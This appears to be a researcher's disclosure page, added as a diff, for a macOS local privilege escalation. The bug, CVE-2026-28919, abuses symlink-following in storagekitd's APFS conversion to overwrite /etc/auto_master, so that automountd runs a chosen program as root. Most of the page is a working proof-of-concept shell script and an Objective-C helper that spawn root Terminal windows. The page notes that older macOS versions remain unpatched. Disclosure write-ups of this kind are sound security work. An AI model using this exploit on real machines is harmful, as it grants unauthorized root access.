@@ -1,0 +1,103 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="initial-scale=1"><link rel="stylesheet" href="/style.css"><link rel="icon" href="/icon.png"><title>amy's website</title></head><body><div class="top"><h1><a href="/">amy's website</a></h1><p><a href="https://github.com/asentientbot" target="_blank">github</a> / <a href="https://asentientbot.ca/@a" target="_blank">fedi</a> / <a href="mailto:asentientbot@gmail.com">email</a></p></div><div><h2>StorageKit bug 3</h2><p>In a <code>diskutil apfs convert</code> bug much like <a href="/storagekit">these</a> <a href="/storagekit-2">two</a>, <code>storagekitd</code> followed symlinks when saving a Core Storage encryption plist.</p><p>Surprisingly, writing mostly uncontrolled XML could still escalate privileges. I made an HFS+ volume with a link to <code>/etc/auto_master</code> and a <i>password hint</i> of an executable's path. After the file was overwritten, <code>automountd</code> ran the program as root (ignoring other lines in the plist).</p><p>I reported the bug in March 2026, and it was fixed in <a href="https://support.apple.com/en-ca/127117" target="_blank">macOS 14.8.7</a>, <a href="https://support.apple.com/en-ca/127116" target="_blank">macOS 15.7.7</a>, and <a href="https://support.apple.com/en-ca/127115" target="_blank">macOS 26.5</a>:</p><pre><code>Impact: An app may be able to gain root privileges
+Description: A consistency issue was addressed with improved state handling.
+CVE-2026-28919: Amy (amys.website)
+</code></pre><p>Ventura and older are still vulnerable.</p><h3>sample code</h3><p>Affected versions will (repeatedly) launch root Terminal windows.</p><pre><code>whole=$(hdiutil attach -nomount -plist ram://10000000 | plutil -extract system-entities.0.dev-entry raw -)
+diskutil partitiondisk $whole gpt jhfs+ evil_cs 1g %Apple_Boot% %noformat% r
+newfs_hfs -v evil_boot ${whole}s3
+diskutil mount ${whole}s3
+
+clang -fmodules -F /System/Library/PrivateFrameworks -framework DiskManagement -l csfde 'cs caller.m' -o /tmp/cs_caller
+/tmp/cs_caller /Volumes/evil_cs correcthorsebatterystaple '
+/home /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal
+'
+
+while [[ $(diskutil cs info -plist evil_cs | plutil -extract CoreStorageLogicalVolumeConversionState raw -) != Complete ]]
+do
+	sleep 1
+done
+
+ln -s /private/etc/auto_master /Volumes/evil_boot/.com.apple.diskmanagement.apfs.convert.SavedEncryptedRootPList
+chflags -h uchg /Volumes/evil_boot/.com.apple.diskmanagement.apfs.convert.SavedEncryptedRootPList
+
+diskutil apfs convert evil_cs
+
+ls /home/hello
+</code></pre><p>Since <code>diskutil cs convert</code> was removed in Big Sur, the script uses this code to encrypt the volume. There's probably a better way.</p><pre><code>@import Foundation;
+@import DiskArbitration;
+
+@interface DMManager:NSObject
++(DMManager*)sharedManager;
+-(void)setDefaultDASession:(DASessionRef)session;
+-(void)setDelegate:(NSObject*)delegate;
+@end
+@interface DMCoreStorage:NSObject
+-(instancetype)initWithManager:(DMManager*)manager;
+-(int)convertDisk:(DADiskRef)disk options:(NSDictionary*)options;
+@end
+NSString* DMUnlocalizedTechnicalErrorString(int);
+NSString* CSFDEStorePassphrase(char*);
+
+@interface AmyDelegate:NSObject
+@end
+
+@implementation AmyDelegate
+
+-(void)dmAsyncStartedForDisk:(DADiskRef)disk
+{
+}
+
+-(void)dmAsyncProgressForDisk:(DADiskRef)disk barberPole:(BOOL)indeterminate percent:(float)percent
+{
+}
+
+-(void)dmAsyncMessageForDisk:(DADiskRef)disk string:(NSString*)string dictionary:(NSDictionary*)dictionary
+{
+	NSLog(@"async message %@",string);
+}
+
+-(void)dmAsyncFinishedForDisk:(DADiskRef)disk mainError:(int)error detailError:(int)detail dictionary:(NSDictionary*)dictionary
+{
+	NSLog(@"async finished error %d (%@) detail %d (%@)",error,DMUnlocalizedTechnicalErrorString(error),detail,DMUnlocalizedTechnicalErrorString(detail));
+	
+	exit(error);
+}
+
+@end
+
+int main(int argCount,char** args)
+{
+	if(argCount!=4)
+	{
+		NSLog(@"usage: %s &lt;path&gt; &lt;pw&gt; &lt;pw hint&gt;",args[0]);
+		return 1;
+	}
+	
+	DMManager* manager=DMManager.sharedManager;
+	DASessionRef session=DASessionCreate(NULL);
+	assert(manager);
+	assert(session);
+	
+	manager.defaultDASession=session;
+	manager.delegate=AmyDelegate.alloc.init;
+	
+	DADiskRef disk=DADiskCreateFromVolumePath(NULL,session,(CFURLRef)[NSURL fileURLWithPath:@(args[1])]);
+	assert(disk);
+	
+	DMCoreStorage* cs=[DMCoreStorage.alloc initWithManager:manager];
+	assert(cs);
+	
+	int error=[cs convertDisk:disk options:@{
+		@"AKSPassphraseUUID":CSFDEStorePassphrase(args[2]),
+		@"AKSPassphraseHint":@(args[3])
+	}];
+	
+	NSLog(@"sync error %d (%@)",error,DMUnlocalizedTechnicalErrorString(error));
+	
+	if(error)
+	{
+		return error;
+	}
+	
+	CFRunLoopRun();
+}
+</code></pre></div></body></html>
